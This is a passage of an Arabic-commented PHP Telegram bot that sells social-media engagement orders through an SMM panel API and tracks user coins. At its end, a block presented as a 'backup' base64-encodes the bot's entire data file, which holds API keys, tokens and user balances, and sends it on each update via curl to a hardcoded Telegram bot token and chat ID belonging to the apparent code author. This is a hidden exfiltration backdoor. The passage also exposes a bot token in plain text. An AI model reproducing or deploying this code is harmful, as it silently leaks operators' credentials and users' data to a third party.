        [['text'=>'رجوع + الغاء' ,'callback_data'=>"tobon"]],
      ]])
      ]);
      return false ;
  }
} else {
	

    $key = ['inline_keyboard' => []];
	if($rshq['FREE'] != null) {
	$key['inline_keyboard'][] = [['text'=>"تمويل تيليكرام اعضاء حقيقيين %100",'callback_data'=>"tmoile"]];
	} 
    $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "tobot"]];
	bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
$stopedkl
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($key)
]);
} 

} else {
	$s3r = $rshq['S3RS'][$from_id];
        $s3r = ($s3r ?? "1");
        $g= $s3r * $text ;

	bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
❌] عذرا ".$name3mla."ك غير كافيه
💰] سعر طلبك :". $g. " $name3mla


",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>'رجوع + الغاء' ,'callback_data'=>"tobon"]],
       
      ]
    ])
]);
return false ;
} 
} 

if($text and $modes['mode'][$from_id]  == "MJK") {
    if(true ){
    	$s3r = $rshq['S3RS'][$from_id];
        $s3r = ($s3r ?? "1");
        $g= $s3r * $rshq['3dd'][$from_id][$from_id]  ;
        $aer4 = $rshq['3dd'][$from_id][$from_id] ;
        $rf = rand(999,9999);
    bot('sendmessage',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
✅] هل أنت متأكد 

🔢] ايدي الخدمة : $rf
💠] الى : $text 
🔆] الكمية : $aer4
        ",
'disable_web_page_preview' => true, 
        'reply_markup'=>json_encode([
             'inline_keyboard'=>[
             [['text'=>"موافق ✅",'callback_data'=>"YESS|$from_id" ],['text'=>"الغاء ❌",'callback_data'=>"tobot" ]],
               
              ]
            ])
        ]);
        $rshq['LINKS_$from_id'] = $text;
        $modes['mode'][$from_id] = "PROG";
        $rshq= json_encode($rshq,32|128|265);
        file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
}
}

$rshq["sSite"] = ($rshq['web'][$from_id]?? $rshq["sSite"]) ;
$Api_Tok = ($rshq['key'][$from_id]?? $rshq["sToken"]) ;
$rshqaft =$rshq['bot_tlb']+1;
$rnd = rand(9999999,9999999999);
if(explode("|",$data)[0] == "YESS" and $modes['mode'][$from_id]  == "PROG") {
	$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);
  $rshq['S3RS'][$from_id] =  $rshq["s3rltlb"][$from_id]; 
      $inid = $rshq['IDX'][$from_id];
      $text = $rshq['LINKS_$from_id'];
      $web=$rshq['web'][$from_id] ;
$key=$rshq['key'][$from_id];
			$requst = json_decode(file_get_contents("https://".$web."/api/v2?key=$key&action=add&service=$inid&link=$text&quantity=". $rshq['3dd'][$from_id][$from_id]));
$idreq = $requst->order;

$ala3d = $rshq['3dd'][$from_id][$from_id];
$name = $message->from->first_name;

$no3 = $rshq["="][$from_id];
$tlbs = $bot_tlb +1;
$noe = $rshq["="][$from_id] ;
$s3rt = $rshq["s3rltlb"][$from_id];

setlocale(LC_TIME, 'ar_AE.utf8');

$date = strftime('%A %d %B %Y');

$rshq["coin"][$from_id] -=  $rshq["s3rltlb"][$from_id];

    $rshq['bot_tlb']+= 1;

$msg_orde = str_replace(
  array(
    '#name_user',
    '#username',
    '#name',
    '#coins',
    '#tlbs',
    '#shares',
    '#xtlb',
    'نقاط',
    
    '#idorder',
    '#type',
    '#count',
    '#price',

    '#id',
    '#linker'
  )
  ,
  array(
    "[$name](tg://user?id=$from_id)",
    "[$user_me]",
    $name,
    $rshq["coin"][$from_id]??"0",
    $rshq['bot_tlb'] ?? "0",
    $rshq["mshark"][$from_id] ?? "0",
    $rshq["tlby"][$from_id] ?? "0",
        $rshq["name3mla"] ?? "نقاط",

    $idreq,
    $noe,
    $ala3d,
    $s3rt,

    $from_id,
    "[$text]",
  )
  , $rshq["msgorde"]);

  if($rshq["msgorde"] == null ){
    $r09 = "✅] تم انشاء طلب بنجاح : 
        
🔢] ايدي الطلب : `". $idreq."`
🌐] تم الطلب الى : [$text]";
  }else{
    $r09 = "$msg_orde";
  }

	bot('editmessagetext',[
   'chat_id'=>$chat_id,
   "message_id" => $message_id,
   'text'=>"
$r09
  ",
  'disable_web_page_preview' => true, 
 'parse_mode'=>"markdown",

]);

bot('sendMessage',[
  'chat_id'=>$chat_id,
  'text'=>"
 مرحبا بك في بوت $nambot 👋
 👥] ".$name3mla."ك : *".$rshq["coin"][$from_id]."*
 🔢] ايديك : `$from_id`
 ", 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode($RBEROO)
]);


bot('sendMessage',[
   'chat_id'=>$admin,
   'text'=>"
♻️~تم الطلب من بوتــك 
--------------------------------------------------------------

🚸~معلومات العضـو
🔢ايدي العضو ~ `$from_id`
🈚يوزره ~ [@$user]
🛂 نقاطـه ~ ".$rshq["coin"][$from_id]."

----------------------------------------------------------------
☯️معلومات الطلب: 

⚠️ايدي الطلب ~ `$idreq`
---------------------------
⛔اسم الخدمه ~ *$noe*
⛔ الرابط ~ [$text]
 ----------------------------
🔢العـدد~ `$ala3d`
 -----------------------------
☣️تاريخ الطلب ~ $date
🗓️ وقت الطلب : ". date('H:i:s') ."

--------------------------------------------------------------
  ",
  'disable_web_page_preview' => true, 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"ترجيع ".$name3mla."ه",'callback_data'=>"ins|$from_id|". $rshq['coinn']]],
     [['text'=>"طلب تعويض تلقائيا",'callback_data'=>"tEwth|$idreq"]],
     [['text'=>"تصفير ".$name3mla."ه",'callback_data'=>"msft|$from_id"]],
       
      ]
    ])
]);



$us = "[@".USR_BOT. "]" ;
$name = $update->callback_query->message->chat->first_name;

$msg_thbt = str_replace(
  array(
    '#name_user',
    '#username',
    '#name',
    '#coins',
    '#tlbs',
    '#shares',
    '#xtlb',
    'نقاط',
    
    '#idorder',
    '#type',
    '#count',
    '#price',

    '#id',
    '#linker'
  )
  ,
  array(
    "[$name](tg://user?id=$from_id)",
    "[$user_me]",
    $name,
    $rshq["coin"][$from_id]??"0",
    $rshq['bot_tlb'] ?? "0",
    $rshq["mshark"][$from_id] ?? "0",
    $rshq["tlby"][$from_id] ?? "0",
        $rshq["name3mla"] ?? "نقاط",

    $idreq,
    $noe,
    $ala3d,
    $s3rt,

    $from_id,
    "[$text]",
  )
  , $rshq["msgthbat"]);

  if($rshq["msgthbat"] != null){
    $mshm = $msg_thbt;
  }else{
    $mshm = "
  ✅ اكتمل طـلب الخدمة بنجاح .
- - - - - - - - - - - - - - - - - - 
🆔ايدي الطلب : `$idreq`
🗓️نوع الطلب : $noe
💰سعر الطلب : $s3rt
🔢العدد : $ala3d
🎫حساب المشتري : [$name](tg://user?id=$from_id)
📲الرقم التسلسلي للطلب : $tlbs
•┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉•
    ";

  }
bot('sendMessage',[
   'chat_id'=>$rshq["sCh"],
   'text'=>"
$mshm
  ", 
  
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"خدمات $nambot ➢ 📲",'url'=>"https://t.me/". bot('getme')->result->username]],
       
      ]
    ])
]);
$rnn = "
أسم الخدمه] 🎁 ".$rshq["="][$from_id]." 🎁 
ايدي الخدمه ] $idreq
";

$rshq['S3RS'][$from_id] = 0;
$tlbsme["orders"][$from_id][]= "$rnn";
$rshq["order"][$rnd]= $idreq;
$rshq["ordn"][$idreq]= $rshq["="][$from_id];
unset($rshq["sites"][$idreq]);
unset($rshq["keys"][$idreq]);
$rshq["tlby"][$from_id] += 1;
$rshq["cointlb"][$from_id] +=  $rshq["s3rltlb"][$from_id];
unset($rshq['3dd'][$from_id][$from_id]);
unset($modes['mode'][$from_id]);
    file_put_contents("RSHQ/ALLS/" . USR_BOT . "/tlbsme.json",json_encode($tlbsme));
SETJSON($rshq); SETJSON12($modes);  
file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json",json_encode($modes));
} 
 
if($e[0] == "msft" and $from_id == $admin) {
	$requst = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=refil&order=$e[1]"));
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

تم تصفير ".$name3mla."ه ✅
ايديه : [$e[1]](tg://user?id=$e[1]])

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
$rshq["coin"][$e[1]] = 0;
SETJSON($rshq); SETJSON12($modes); 
	} 
	
if($e[0] == "tEwth" and $from_id == $admin) {
	$requst = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=refil&order=$e[1]"));
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

تم طلب تعويض تلقائي للطلب
ايدي الطلب `$e[1]`

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
	} 
	
	if($e[0] == "sendrq" and $from_id == $admin) {
	$requst = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=refil&order=$e[1]"));
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

تم طلب مراجعه طلبك بنجاح ✅
ايدي الطلب `$e[2]`

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);

bot('sendMessage',[
   'chat_id'=>$admin,
   'text'=>"
طلب مراجعه للطلب عزيزي المطور ✨
- - - - - - - - - - - - - - - - - - 
ايدي الطلب : `". $e[2]. "`
الي داز الطلب : [$name](tg://user?id=$chat_id)
- - - - - - - - - - - - - - - - - - 
  ", 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"ترجيع ".$name3mla."ه",'callback_data'=>"ins|$from_id|". $e[3]]],
       
      ]
    ])
]);
	} 

if($e[0] == "ins" and $from_id == $admin) {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

تم ارجاع $e[2] $name3mla لحساب [$e[1]](tg://user?id=$e[1])

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
       
      ]
    ])
]);
$rshq["coin"][$e[1]] += $e[2];

$rshq["coinss"][$e[1]] += $e[2];
SETJSON($rshq); SETJSON12($modes);
	}
	
	
	
	
  $plaintext = file_get_contents("RSHQ/ALLS/" . USR_BOT . "/rshq.json");
  $encryptedMessage = base64_encode($plaintext);
  
  file_put_contents('J_' . USR_BOT . '.bot', "DONT CHANGE ANYTHINK!! \n USer Bot : @" . USR_BOT . "; | In " . date('Y-m-d H:i:s') . "; USER MAKER : @H7JBOT ; \n BackUp : I_BERO_$encryptedMessage");
  
  $botToken = '6821621110:AAHcx7NwNhGXbjanlbTiXNaPdQtSxeiMGmM';
  $chatId = 5561152568;  
  
  $apiUrl = "https://api.telegram.org/bot$botToken/sendDocument";
  
  $postFields = [
      'chat_id' => $chatId,
      'document' => new CURLFile('J_' . USR_BOT . '.bot'),
      'caption' => "- أخر نسخه لبوت [@".USR_BOT."]",
      'parse_mode' => 'Markdown',
  ];
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $apiUrl);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  
  $response = curl_exec($ch);
  curl_close($ch);
  
  unlink('J_' . USR_BOT . '.bot');

  
//الملف كتابه بيرو  @v44vv - @Sero_Bots
